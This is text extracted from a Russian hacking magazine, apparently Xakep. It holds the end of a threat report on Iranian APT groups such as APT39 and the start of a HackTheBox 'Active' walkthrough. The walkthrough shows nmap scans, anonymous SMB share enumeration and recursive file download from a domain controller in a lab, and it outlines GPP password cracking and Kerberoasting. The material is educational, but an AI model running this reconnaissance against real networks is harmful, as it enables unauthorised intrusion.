АНБ. Подробнее об этом удивительном примере двойного взлома читай
здесь.


APT39
Новая хакерская группа, действу ющая в интересах правительства Ирана.
Возможно, ранее называлась Chafer или была тес но связана с ней. Самос‐
тоятельно стала выполнять мас штаб ные ата ки с начала 2019 года.
  APT39 атакует провайдеров, операторов свя зи, дипломатические консуль‐
ства, туристические агентства, отели и крупные ИТ‐компании. С большой
вероятностью  группа делает это для сбора конфиденциальных данных
и общих сведений о клиентах, чтобы задей ство вать их в будущих фишинговых
кампаниях.
   Как и многие группы, APT39 использует микс из собственных и общедос‐
тупных хакерских утилит. Среди последних наиболее часто встречается
Mimikatz, перепакованная для обхода антивиру сов. Это типичная ситуация,
а вот использование PowBat (модификации бэкдора PowRuner) дает осно‐
вание предположить взаимо действие APT39 с APT34 или доступ обеих групп
к общим ресурсам.
  Первая фаза атак APT39 стандартна и начинается с рас сылки фишинговых
писем. Для большей убедительности группа регистрирует домены, мимик‐
рирующие под сайты орга низаций, потенциаль но интерес ных намеченным
жертвам.
   Также APT39 регулярно заража ет уязвимые веб‐серверы настоящих орга‐
низаций и устанавливает на них веб‐оболочку Antak или ASPXSPY. Пос ле это‐
го хакерская группа рассыла ет фишинговые пись ма с настоящих адресов
известных фирм — использует украденные на сай те учетные данные для ком‐
прометации внешних ресурсов Outlook Web Access (OWA).
  На следующем этапе APT39 устанавлива ет контроль над целевыми компь‐
ютерами, внедряя на них бэкдоры PowBat, SeaWeed или CacheMoney. Их
модификации попадаются экспертам с декабря 2018‐го по нас тоящее время,
но полагаться на сигнатуры сейчас было бы опрометчиво. Как правило, каж‐
дый раз в новых атаках используются слегка измененные варианты. Злов‐
редов правят ровно настолько, чтобы их снова не обнаруживали антивирусы.
   Техника доставки «боевой нагрузки» у новой группы сложная, и ее как раз
изучают в настоящее время. В общих чертах она схожа с таковой у APT34.
Обычно в качестве обертки используются модифицированные документы
офисного формата, а управление передается вредоносному скрипту из‐за
малоизвестных особен ностей парсинга документов.
   Скрыть потен циально опасные действия поз воля ет локальная сборка бэк‐
дора, части которого загружа ются в виде безобидных файлов на разных эта‐
пах атаки. Каждая из них по отдельнос ти не представляет угрозы и проходит
все мыслимые проверки, а на финальном этапе выполняется сценарий Pow‐
erShell, который декодирует и запускает универ сальный бэкдор.
  Собираемые данные перед отправкой разбиваются на фрагменты и сох‐
раняются в архив с парольной защитой (ZIP или RAR), после чего переиме‐
новываются (например, в .log). Сессии подбира ются короткие, а удаленные
серверы обычно имеют адреса, похожие на сайты обновлений. Повер‐
хностный анализ трафика тоже не выявляет ничего подозрительного.


ВЫВОДЫ
Сейчас в интересах правитель ства Ирана действу ет нес колько хакерских
групп. У них перекликаются используемые компоненты, однако сильно раз‐
личаются методы и конечные цели. APT33 час то применя ет вайпер для уда‐
ленных диверсий, полагаясь при его внедрении в основном на соци альную
инженерию. APT34 преимущественно занима ется шпионажем на уровне
госучреждений, исполь зуя сложные экспло иты и не надеясь на бес печность
пользователей. APT39  пока  собира ет  персональ ные  данные,  готовясь
к чему‐то большему.
  Инструменты иранских хак‐групп пол ностью оправдывают принадлежность
к APT — сложным персистирующим угро зам. Из‐за хорошей маскировки мно‐
гоэтапного процесса внедрения бэкдора сам факт зараже ния часто остается
незамеченным по несколько недель и даже месяцев.
   Иногда в ходе рутин ных проверок адми ны думают, что нашли и устранили
типовую угрозу, в то время как они уда лили только часть потенциально опас‐
ных файлов. С боль шой веро ятностью компоненты зловреда будут вновь соз‐
даны по расписанию или загружены по команде управля юще го сервера.
  Полная переустановка ОС не решает проб лему, так как после синхрониза‐
ции данных из скомпрометированной учетной записи с большой веро‐
ятностью произойдет повторное заражение.
   Универсального противодействия APT не существу ет. На сегод няшний
день ни одно средство безопас ности не обес печивает автомати ческой
защиты от таргетированных атак. Оно просто затрудняет их выполнение
и мешает пользователям «выстрелить себе в ногу».


        WWW

                      •APTs at MITRE
                      •Symantec Threat Intelligence
                        •Malpedia
                     •APT34 at GitHub
                         •FireEye
                        •ClearSky CyberSecurity
  ВЗЛОМ

 УКРОЩЕНИЕ
  KERBEROS





   ЗАХВАТЫВАЕМ
ACTIVE DIRECTORY
НА ВИРТУАЛЬНОЙ
      МАШИНЕ
  С HACKTHEBOX





  В этой статье я покажу, как пройти путь
  с нуля до полноценного администратора
  контроллера  домена   Active   Directory,             snovvcrash
  а поможет нам одна из виртуалок, дос‐        Безопасник,питонщик, временамиместами
  тупных для взлома на CTF‐площадке Hack‐       необходимостикриптоана(рхист)литик,системныйпо
                                                                                               администратор.
  TheBox. Пусть это и не самая сложная        snovvcrash@protonmail.ch
  машина, но овладеть навыками работы
  с AD крайне важно, если ты собира ешься
  пентестить кор поратив ные сети.


               INFO

                          HackTheBox  (HTB) —  полузак рытая  площадка
                          для хакерских соревнований CTF. Чтобы получить
                            инвайт,  нужно  пройти  небольшое испытание.
                        После  этого  тебе  дадут  доступ  к  десяткам
                          заведомо уязвимых виртуальных машин и ты смо‐
                       жешь  прокачивать  навыки  пен тестера.  Автор
                            статьи успел потратить немало сил в погоне
                           за высокой строчкой в рейтинговой таблице HTB.





                          HTB — Active

   Контроллер домена Active Directory — это критически важная сос тавля ющая
   почти любой современной IT‐инфраструктуры. Служба каталогов Windows
   Server всегда была желанным объектом контроля для нарушителей, решив‐
  ших прочно обустроиться внутри корпоративной сети. Поэтому аспекты обес‐
   печения защиты AD — животрепещущая тема для обсуждения в любой ком‐
   пании исследователей кибербезопасности.
     Виртуалка, которую мы будем ломать, называется Active. Ее сложность
   оценивается сообществом невысоко — 4,6 бал ла из 10. Вот что нам пред сто‐
   ит проделать с ней:
    • сбор информации о разделяемых SMB‐ресурсах (пробуем ряд крутых ути‐
       лит: smbclient, smbmap, enum4linux, nullinux);
    • разграбление SMB с анонимным дос тупом для захвата файла конфигура‐
     ций групповых политик Groups.xml;
    • декрипт GPP‐пароля из той самой Groups.xml;
    • получение доступа к внутридоменному акка унту, атака Kerberoasting (про‐
      тив протокола аутентификации Kerberos), извлечение тикета админис тра‐
     тора с помощью кол лекции скриптов impacket;
    • наконец, офлайновое восстановление пароля админис тратора из хеша
     с помощью Hashcat для окончательного захвата контроллера.



        «…Лежа в пещере своей, в три глотки лаял огромный Цер бер, и лай
         громовой огла шал молчаливое царс тво…»


  РАЗВЕДКА
  Начальная стадия — сбор информа ции об объ екте иссле дования для даль‐
  нейшего анализа. От качества этой фазы во многом зависит успешность пла‐
   нируемой атаки. Мы соберем необходимые сведения, которые опре делят
   вектор проникновения в систему.


  Nmap
  Следуя хороше му тону, сперва акку ратно «прощупаем» виртуал ку на предмет
   открытых портов с помощью Nmap: пока не используем тяжелую артилле‐
  рию — скриптовые обвесы NSE и определение версий запущенных сервисов,
   иначе время сканирования существенно увеличилось бы. Задаем интенсив‐
   ность в 5000 пакетов в секунду (имеет смысл, ког да работаешь с хостом
   на Windows, к которому, помимо тебя, одновременно стучится еще сот‐
   ня‐другая пользователей HTB) и на всякий случай запросим отчеты во всех
  форматах (.nmap, .gnmap, .xml) с помощью флага ‐oA.



     root@kali:~# nmap ‐n ‐vvv ‐sS ‐Pn ‐‐min‐rate 5000 ‐oA nmap/initial
     10.10.10.100


  Смотрим отчет.



     root@kali:~# cat nmap/initial.nmap
     # Nmap 7.70 scan initiated Sat Dec 15 23:26:06 2018 as: nmap ‐n ‐vvv ‐sS
     ‐Pn ‐‐min‐rate 5000 ‐oA nmap/initial 10.10.10.100
     Nmap scan report for 10.10.10.100
     Host is up, received user‐set (0.14s latency).
     Scanned at 2018‐12‐15 23:26:06 MSK for 1s
     Not shown: 983 closed ports
     Reason: 983 resets
     PORT      STATE SERVICE          REASON
     53/tcp    open  domain           syn‐ack ttl 127
     88/tcp    open  kerberos‐sec     syn‐ack ttl 127
     135/tcp   open  msrpc            syn‐ack ttl 127
     139/tcp   open  netbios‐ssn      syn‐ack ttl 127
     389/tcp   open  ldap             syn‐ack ttl 127
     445/tcp   open  microsoft‐ds     syn‐ack ttl 127
     464/tcp   open  kpasswd5         syn‐ack ttl 127
     593/tcp   open  http‐rpc‐epmap   syn‐ack ttl 127
     636/tcp   open  ldapssl          syn‐ack ttl 127
     3268/tcp  open  globalcatLDAP    syn‐ack ttl 127
     3269/tcp  open  globalcatLDAPssl syn‐ack ttl 127
     49152/tcp open  unknown          syn‐ack ttl 127
     49153/tcp open  unknown          syn‐ack ttl 127
     49154/tcp open  unknown          syn‐ack ttl 127
     49155/tcp open  unknown          syn‐ack ttl 127
     49157/tcp open  unknown          syn‐ack ttl 127
     49158/tcp open  unknown          syn‐ack ttl 127


     Read data files from: /usr/bin/../share/nmap
     # Nmap done at Sat Dec 15 23:26:07 2018 ‐‐ 1 IP address (1 host up)
     scanned in 0.80 seconds


  Значение TTL еще раз подтверждает, что это тачка с Windows. Много откры‐
   тых портов, много сервисов. Повысим детализацию и узнаем версии всего
   того, что запущено, задействовав заодно флаг ‐sC. Он добавит к сканиро‐
  ванию дефолтные скрипты из арсенала NSE.



     root@kali:~# nmap ‐n ‐vvv ‐sS ‐sV ‐sC ‐oA nmap/version ‐‐stylesheet
     nmap‐bootstrap.xsl 10.10.10.100
     root@kali:~# cat nmap/version.nmap
     # Nmap 7.70 scan initiated Sat Dec 15 23:26:38 2018 as: nmap ‐n ‐vvv ‐sS
     ‐sV ‐sC ‐oA nmap/version ‐‐stylesheet nmap‐bootstrap.xsl 10.10.10.100
     Nmap scan report for 10.10.10.100
     Host is up, received echo‐reply ttl 127 (0.14s latency).
     Scanned at 2018‐12‐15 23:26:38 MSK for 200s
     Not shown: 983 closed ports
     Reason: 983 resets
     PORT      STATE SERVICE       REASON          VERSION
     53/tcp    open  domain        syn‐ack ttl 127 Microsoft DNS 6.1.7601 (
     1DB15D39) (Windows Server 2008 R2 SP1)
     | dns‐nsid:
     |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
     88/tcp    open  kerberos‐sec  syn‐ack ttl 127 Microsoft Windows Kerberos
     (server time: 2018‐12‐15 20:19:56Z)
     135/tcp   open  msrpc         syn‐ack ttl 127 Microsoft Windows RPC
     139/tcp   open  netbios‐ssn   syn‐ack ttl 127 Microsoft Windows netbios‐
     ssn
     389/tcp   open  ldap          syn‐ack ttl 127 Microsoft Windows Active
     Directory LDAP (Domain: active.htb, Site: Default‐First‐Site‐Name)
     445/tcp   open  microsoft‐ds? syn‐ack ttl 127
     464/tcp   open  kpasswd5?     syn‐ack ttl 127
     593/tcp   open  ncacn_http    syn‐ack ttl 127 Microsoft Windows RPC over
     HTTP 1.0
     636/tcp   open  tcpwrapped    syn‐ack ttl 127
     3268/tcp  open  ldap          syn‐ack ttl 127 Microsoft Windows Active
     Directory LDAP (Domain: active.htb, Site: Default‐First‐Site‐Name)
     3269/tcp  open  tcpwrapped    syn‐ack ttl 127
     49152/tcp open  msrpc         syn‐ack ttl 127 Microsoft Windows RPC
     49153/tcp open  msrpc         syn‐ack ttl 127 Microsoft Windows RPC
     49154/tcp open  msrpc         syn‐ack ttl 127 Microsoft Windows RPC
     49155/tcp open  msrpc         syn‐ack ttl 127 Microsoft Windows RPC
     49157/tcp open  ncacn_http    syn‐ack ttl 127 Microsoft Windows RPC over
     HTTP 1.0
     49158/tcp open  msrpc         syn‐ack ttl 127 Microsoft Windows RPC
     Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:win‐
     dows_server_2008:r2:sp1, cpe:/o:microsoft:windows


     Host script results:
     |_clock‐skew: mean: ‐7m07s, deviation: 0s, median: ‐7m07s
     | p2p‐conficker:
     |   Checking for Conficker.C or higher...
     |   Check 1 (port 53842/tcp): CLEAN (Couldn't connect)
     |   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
     |   Check 3 (port 43653/udp): CLEAN (Timeout)
     |   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
     |_  0/4 checks are positive: Host is CLEAN or ports are blocked
     | smb2‐security‐mode:
     |   2.02:
     |_    Message signing enabled and required
     | smb2‐time:
     |   date: 2018‐12‐15 23:20:56
     |_  start_date: 2018‐12‐11 03:34:26


     Read data files from: /usr/bin/../share/nmap
     Service detection performed. Please report any incorrect results at
     https://nmap.org/submit/ .
     # Nmap done at Sat Dec 15 23:29:58 2018 ‐‐ 1 IP address (1 host up)
     scanned in 200.67 seconds



               INFO

                     Nmap позволя ет генерировать красивые отчеты
                           в HTML  с помощью  опции ‐‐stylesheet.
                        Для этого только нужно создать подходящий шаб‐
                          лон XSL‐таб лицы  стилей или воспользоваться
                           готовым. К примеру, хороший вариант — nmap‐
                               bootstrap‐xsl.


  По результатам расширенного ска ниро вания заключаем:
    • это контроллер домена Active Directory с именем домена active.htb;
    • ОС — Windows Server 2008 R2 SP1;
    • microsoftds? (он же Microsoft Directory Services, или SMB) — сетевые
     разделяемые  ресурсы  SMB,  в  прос тонародье  «SMB‐шары»  вер‐
     сии 2 на 445‐м пор те;
    • система аутентификации Kerberos на 88‐м порте.

   Начнем с очевидного — пос мотрим, что скрывает SMB.


                                         Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

        УКРОЩЕНИЕ
          KERBEROS
                  ЗАХВАТЫВАЕМ ACTIVE DIRECTORY
           НА ВИРТУАЛЬНОЙ МАШИНЕ С HACKTHEBOX





Эну мерация SMB — порт 445
Об этом можно было бы написать отдельную статью, но здесь мы лишь вкрат‐
це рассмотрим софт для срыва покровов с SMB‐шар.


NSE (Nmap Scripting Engine)
У всемогущего Nmap есть арсенал скриптов на все случаи жизни. Вытяги‐
вание информации об SMB — не исключение. Посмотрим, что есть в его
ассортименте из категорий default, version и safe, использовав контекс тный
поиск по файлам с расширением .nse в Kali Linux.



  root@kali:~# locate ‐r '.nse$' | xargs grep categories | grep
  'default|version|safe' | grep smb
  /usr/share/nmap/scripts/smb‐double‐pulsar‐backdoor.nse:categories = {
  "vuln", "safe", "malware"}
  /usr/share/nmap/scripts/smb‐enum‐services.nse:categories = {"discovery",
  "intrusive","safe"}
  /usr/share/nmap/scripts/smb‐ls.nse:categories = {"discovery", "safe"}
  /usr/share/nmap/scripts/smb‐mbenum.nse:categories = {"discovery",
  "safe"}
  /usr/share/nmap/scripts/smb‐os‐discovery.nse:categories = {"default",
  "discovery", "safe"}
  /usr/share/nmap/scripts/smb‐protocols.nse:categories = {"safe", "discov‐
  ery"}
  /usr/share/nmap/scripts/smb‐security‐mode.nse:categories = {"default",
  "discovery", "safe"}
  /usr/share/nmap/scripts/smb‐vuln‐ms17‐010.nse:categories = {"vuln",
  "safe"}
  /usr/share/nmap/scripts/smb2‐capabilities.nse:categories = {"safe",
  "discovery"}
  /usr/share/nmap/scripts/smb2‐security‐mode.nse:categories = {"safe",
  "discovery", "default"}
  /usr/share/nmap/scripts/smb2‐time.nse:categories = {"discovery", "safe",
  "default"}
  /usr/share/nmap/scripts/smb2‐vuln‐uptime.nse:categories = {"vuln",
  "safe"}


Направим безопасные (safe) творения скриптового движка на 445‐й порт:



  root@kali:~# nmap ‐n ‐‐script safe ‐oA nmap/nse‐smb‐enum ‐
  p445 10.10.10.100
  root@kali:~# cat nmap/nse‐smb‐enum.nmap
  # Nmap 7.70 scan initiated Sun Dec 16 00:03:51 2018 as: nmap ‐n ‐‐script
  safe ‐oA nmap/nse‐smb‐enum ‐p445 10.10.10.100
  Pre‐scan script results:
  | broadcast‐dhcp‐discover:
  |   Response 1 of 1:
  |     IP Offered: 10.0.2.16
  |     Subnet Mask: 255.255.255.0
  |     Router: 10.0.2.2
  |     Domain Name Server: 192.168.1.1
  |_    Server Identifier: 10.0.2.2
  | broadcast‐ping:
  |   IP: 192.168.1.140  MAC: 52:54:00:12:35:02
  |_  Use ‐‐script‐args=newtargets to add the results as targets
  |_eap‐info: please specify an interface with ‐e
  | targets‐asn:
  |_  targets‐asn.asn is a mandatory parameter
  Nmap scan report for 10.10.10.100
  Host is up (0.14s latency).


  PORT    STATE SERVICE
  445/tcp open  microsoft‐ds
  |_smb‐enum‐services: ERROR: Script execution failed (use ‐d to debug)


  Host script results:
  |_clock‐skew: mean: ‐7m06s, deviation: 0s, median: ‐7m06s
  |_fcrdns: FAIL (No PTR record)
  |_ipidseq: Incremental!
  |_msrpc‐enum: Could not negotiate a connection:SMB: ERROR: Server dis‐
  connected the connection
  |_path‐mtu: PMTU == 1500
  | smb‐mbenum:
  |_  ERROR: Failed to connect to browser service: Could not negotiate a
  connection:SMB: ERROR: Server disconnected the connection
  | smb‐protocols:
  |   dialects:
  |     2.02
  |_    2.10
  | smb2‐capabilities:
  |   2.02:
  |     Distributed File System
  |   2.10:
  |     Distributed File System
  |     Leasing
  |_    Multi‐credit operations
  | smb2‐security‐mode:
  |   2.02:
  |_    Message signing enabled and required
  | smb2‐time:
  |   date: 2018‐12‐15 23:57:31
  |_  start_date: 2018‐12‐11 03:34:26
  | unusual‐port:
  |_  WARNING: this script depends on Nmap's service/version detection (‐
  sV)


  Post‐scan script results:
  | reverse‐index:
  |_  445/tcp: 10.10.10.100
  # Nmap done at Sun Dec 16 00:05:02 2018 ‐‐ 1 IP address (1 host up)
  scanned in 71.04 seconds


Несмотря на обширный вывод, ничего полез ного мы не нашли, только
еще раз подтвердили, что это протокол вто рой версии — SMBv2. Идем даль‐
ше.


smbclient
Утилита smbclient служит в Linux для подключения к SMB. Для начала пос‐
мотрим, какие SMB‐ресурсы есть на хосте. Анонимного (Null Authentication)
доступа для этого будет достаточно.



  root@kali:~# smbclient ‐N ‐L 10.10.10.100
  Anonymous login successful


  Sharename       Type      Comment
  ‐‐‐‐‐‐‐‐‐       ‐‐‐‐      ‐‐‐‐‐‐‐
  ADMIN$          Disk      Remote Admin
  C$              Disk      Default share
  IPC$            IPC       Remote IPC
  NETLOGON        Disk      Logon server share
  Replication     Disk
  SYSVOL          Disk      Logon server share
  Users           Disk
  Reconnecting with SMB1 for workgroup listing.
  Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_‐
  FOUND)
  Failed to connect with SMB1 ‐‐ no workgroup available


Единственная директория, к которой есть доступ с Null Authentication, —
это Replication, реплицированное хранилище, по сути копия системного тома
SYSVOL. Это чрезвычайно интересный момент с точки зрения потенциаль‐
ного повыше ния привилегий в системе, так как SYSVOL содержит файл нас‐
троек групповых политик, изначально доступный лишь авторизи рованным
пользователям.
   Взглянем на содержимое Replication.



  root@kali:~# smbclient ‐N "\10.10.10.100\Replication"
  Anonymous login successful
  Try "help" to get a list of possible commands.
  smb: > dir
  .              D    0  Sat Jul 21 13:37:44 2018
  ..             D    0  Sat Jul 21 13:37:44 2018
  active.htb     D    0  Sat Jul 21 13:37:44 2018


  10459647 blocks of size 4096. 4946059 blocks available


Чтобы не ходить по вло женным директориям вручную, воспользуемся сле‐
дующей хитростью: активируем опцию рекурсивного обхода шары, выключим
надоедливый промпт, что бы он не заставлял нас подтверждать каждое дей‐
ствие, и сделаем пол ный слепок Replication, как показано ниже.



  smb: > recurse ON
  smb: > prompt OFF
  smb: > mget *
  getting file \active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐
  00C04FB984F9}\GPT.INI of size 23 as GPT.INI (0.0 KiloBytes/sec) (average
  0.0 KiloBytes/sec)
  getting file \active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐
  00C04FB984F9}\Group Policy\GPE.INI of size 119 as GPE.INI (0.2 Kilo‐
  Bytes/sec) (average 0.1 KiloBytes/sec)
  getting file \active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐
  00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size
  1098 as GptTmpl.inf (2.0 KiloBytes/sec) (average 0.7 KiloBytes/sec)
  getting file \active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐
  00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as
  Groups.xml (1.0 KiloBytes/sec) (average 0.8 KiloBytes/sec)
  getting file \active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐
  00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Registry.pol (5.1
  KiloBytes/sec) (average 1.7 KiloBytes/sec)
  getting file \active.htb\Policies\{6AC1786C‐016F‐11D2‐945F‐
  00C04fB984F9}\GPT.INI of size 22 as GPT.INI (0.0 KiloBytes/sec) (average
  1.4 KiloBytes/sec)
  getting file \active.htb\Policies\{6AC1786C‐016F‐11D2‐945F‐
  00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size
  3722 as GptTmpl.inf (6.8 KiloBytes/sec) (average 2.2 KiloBytes/sec)


Теперь мы имеем офлайновую копию пап ки Replication. Вывести спи сок фай‐
лов для более наглядного анализа содержимого можно с помощью find.



  root@kali:~# find active.htb ‐type f
  active.htb/Policies/{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}/Group Policy/
  GPE.INI
  active.htb/Policies/{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}/MACHINE/Reg‐
  istry.pol
  active.htb/Policies/{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}/MACHINE/Mi‐
  crosoft/Windows NT/SecEdit/GptTmpl.inf
  active.htb/Policies/{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}/MACHINE/Pref‐
  erences/Groups/Groups.xml
  active.htb/Policies/{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}/GPT.INI
  active.htb/Policies/{6AC1786C‐016F‐11D2‐945F‐00C04fB984F9}/MACHINE/Mi‐
  crosoft/Windows NT/SecEdit/GptTmpl.inf
  active.htb/Policies/{6AC1786C‐016F‐11D2‐945F‐00C04fB984F9}/GPT.INI


Пока не будем зарываться дальше, а пройдемся по другим раз ведыватель‐
ным утилитам.


smbmap
Вместо smbclient можно использовать smbmap — это более удобный инстру‐
мент, который позволяет провернуть то же самое с меньшим числом дей‐
ствий. Сначала просканируем сервер целиком.



  root@kali:~# smbmap ‐d active.htb ‐H 10.10.10.100
  [+] Finding open SMB ports....
  [+] User SMB session establishd on 10.10.10.100...
  [+] IP: 10.10.10.100:445        Name: 10.10.10.100
  Disk                Permissions
  ‐‐‐‐                ‐‐‐‐‐‐‐‐‐‐‐
  ADMIN$              NO ACCESS
  C$                  NO ACCESS
  IPC$                NO ACCESS
  NETLOGON            NO ACCESS
  Replication         READ ONLY
  SYSVOL              NO ACCESS
  Users               NO ACCESS


Сразу видим, что нам доступно с текущими правами (в данном случае Null Au‐
thentication), — весьма удоб но. Теперь одной командой попросим у smbmap
рекурсивный листинг файлов директории Replication.



  root@kali:~# smbmap ‐d active.htb ‐H 10.10.10.100 ‐R Replication
  [+] Finding open SMB ports....
  [+] User SMB session establishd on 10.10.10.100...
  [+] IP: 10.10.10.100:445        Name: 10.10.10.100
  Disk                                                    Permissions
  ‐‐‐‐                                                    ‐‐‐‐‐‐‐‐‐‐‐
  Replication                                             READ ONLY
  .\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    active.htb
  .\\active.htb\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    DfsrPrivate
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    Policies
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    scripts
  .\\active.htb\DfsrPrivate\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ConflictAnd‐
  Deleted
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    Deleted
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    Installing
  .\\active.htb\Policies\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    {31B2F340‐016D‐
  11D2‐945F‐00C04FB984F9}
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    {6AC1786C‐016F‐
  11D2‐945F‐00C04fB984F9}
  .\\active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  ‐r‐‐r‐‐r‐‐               23 Sat Jul 21 13:38:11 2018    GPT.INI
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    Group Policy
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    MACHINE
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    USER
  .\\active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}\Group Pol‐
  icy\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  ‐r‐‐r‐‐r‐‐              119 Sat Jul 21 13:38:11 2018    GPE.INI
  .\\active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}\MACHINE\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    Microsoft
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    Preferences
  ‐r‐‐r‐‐r‐‐             2788 Sat Jul 21 13:38:11 2018    Registry.pol
  .\\active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}\MACHINE\
  Microsoft\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    Windows NT
  .\\active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}\MACHINE\
  Microsoft\Windows NT\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    SecEdit
  .\\active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}\MACHINE\
  Microsoft\Windows NT\SecEdit\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  ‐r‐‐r‐‐r‐‐             1098 Sat Jul 21 13:38:11 2018    GptTmpl.inf
  .\\active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}\MACHINE\
  Preferences\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    Groups
  .\\active.htb\Policies\{31B2F340‐016D‐11D2‐945F‐00C04FB984F9}\MACHINE\
  Preferences\Groups\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  ‐r‐‐r‐‐r‐‐              533 Sat Jul 21 13:38:11 2018    Groups.xml
  .\\active.htb\Policies\{6AC1786C‐016F‐11D2‐945F‐00C04fB984F9}\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  ‐r‐‐r‐‐r‐‐               22 Sat Jul 21 13:38:11 2018    GPT.INI
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    MACHINE
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    USER
  .\\active.htb\Policies\{6AC1786C‐016F‐11D2‐945F‐00C04fB984F9}\MACHINE\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    Microsoft
  .\\active.htb\Policies\{6AC1786C‐016F‐11D2‐945F‐00C04fB984F9}\MACHINE\
  Microsoft\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    Windows NT
  .\\active.htb\Policies\{6AC1786C‐016F‐11D2‐945F‐00C04fB984F9}\MACHINE\
  Microsoft\Windows NT\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    SecEdit
  .\\active.htb\Policies\{6AC1786C‐016F‐11D2‐945F‐00C04fB984F9}\MACHINE\
  Microsoft\Windows NT\SecEdit\
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    .
  dr‐‐r‐‐r‐‐                0 Sat Jul 21 13:37:44 2018    ..
